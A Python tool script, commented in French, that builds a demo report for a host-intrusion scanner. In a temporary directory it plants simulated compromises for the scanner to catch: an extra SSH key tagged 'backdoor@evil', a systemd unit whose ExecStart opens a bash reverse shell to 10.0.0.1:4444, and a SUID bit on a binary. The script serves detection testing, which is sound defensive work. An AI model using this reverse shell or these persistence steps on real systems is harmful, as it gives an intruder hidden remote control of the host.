"""Génère un rapport de démo V4 (SIG-0017 systemd, SIG-0018 SUID).

Crée un dossier temporaire avec un fichier `authorized_keys` initial,
y ajoute une clé ed25519, ajoute un service systemd malveillant, et
donne le bit SUID à un binaire. Le clair d'`authorized_keys` n'est plus
embarqué dans une baseline non chiffrée : SIG-0019 est annoncée comme
désactivée (même contrat qu'une baseline chiffrée) au lieu de se
déclencher. SIG-0007 voit toujours les clés du fichier actuel.
Les rapports `demo_v4_report.*` versionnés ont été produits avant cette
omission et peuvent encore mentionner SIG-0019.

Usage :
  python3 tools/make_demo_v4.py
"""

from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
from pathlib import Path


SCANNER = ["python3", "-m", "sentinel"]


def make_demo() -> None:
    repo = Path(__file__).resolve().parents[1]
    out_dir = repo
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        # 1) État initial : authorized_keys avec 1 clé ed25519.
        ak = td / "authorized_keys"
        ak.write_text("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAA initial@host\n")

        # Un binaire SANS SUID.
        bin_ = td / "tool"
        bin_.write_text("#!/bin/sh\necho hi\n")
        bin_.chmod(0o755)

        # Baseline sur cet état.
        baseline_path = out_dir / "demo_v4_baseline.json"
        subprocess.run(
            [*SCANNER, "baseline", str(td), "--out", str(baseline_path)],
            check=True,
            cwd=repo,
        )

        # 2) Modifications : ajout d'une clé ed25519, ajout d'un service
        # systemd malveillant, ajout du SUID sur `tool`.
        ak.write_text(ak.read_text() + "ssh-ed25519 BBBBC3NzaC1lZDI1NTE5AAAAIBBB backdoor@evil\n")
        svc = td / "etc/systemd/system"
        svc.mkdir(parents=True)
        (svc / "backdoor.service").write_text(
            "[Service]\nExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        )
        bin_.chmod(0o4755)  # SUID

        # 3) Scan avec baseline → SIG-0017, SIG-0018, SIG-0019.
        out_txt = out_dir / "demo_v4_report.txt"
        out_json = out_dir / "demo_v4_report.json"
        for fmt, outp in (("text", out_txt), ("json", out_json)):
            r = subprocess.run(
                [*SCANNER, "scan", str(td), "--baseline", str(baseline_path), "--format", fmt],
                cwd=repo,
                capture_output=True,
                text=True,
                check=False,
            )
            outp.write_text(r.stdout)

    print(f"Baseline : {baseline_path}", file=sys.stderr)
    print(f"Rapport texte : {out_txt}", file=sys.stderr)
    print(f"Rapport JSON : {out_json}", file=sys.stderr)
    # Quick summary : ne montre que les nouvelles règles V4.
    for line in out_txt.read_text().splitlines():
        if line.startswith(("[critical]", "[high]", "[medium]")) and (
            "SIG-0017" in line or "SIG-0018" in line or "SIG-0019" in line
        ):
            print("  " + line, file=sys.stderr)


if __name__ == "__main__":
    make_demo()
